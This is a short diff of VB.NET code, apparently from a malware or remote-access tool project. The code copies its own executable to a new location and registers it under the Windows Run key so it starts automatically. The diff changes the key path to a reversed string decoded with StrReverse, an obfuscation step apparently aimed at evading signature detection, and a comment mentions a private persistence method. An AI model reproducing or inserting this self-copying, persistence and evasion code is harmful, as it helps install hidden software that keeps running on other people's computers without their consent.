@@ -15,9 +15,6 @@ Public Class Main
                 Using FS As New IO.FileStream(LOC, IO.FileMode.Create)
                     Dim EXE As Byte() = IO.File.ReadAllBytes(Current)
                     FS.Write(EXE, 0, EXE.Length)
-                    FS.Flush()
-                    FS.Dispose()
-                    EXE = Nothing
                 End Using
 
                 AddedReg(LOC)
@@ -33,7 +30,7 @@ Public Class Main
 
     Public Shared Sub AddedReg(ByVal LOC As String)
         'You have to create your own persistence method, I can't share mine here.
-        Try : Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run\").SetValue(IO.Path.GetFileName(LOC), LOC) : Catch : End Try
+        Try : Microsoft.Win32.Registry.CurrentUser.CreateSubKey(StrReverse("\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS")).SetValue(IO.Path.GetFileName(LOC), LOC) : Catch : End Try
     End Sub
 End Class
 
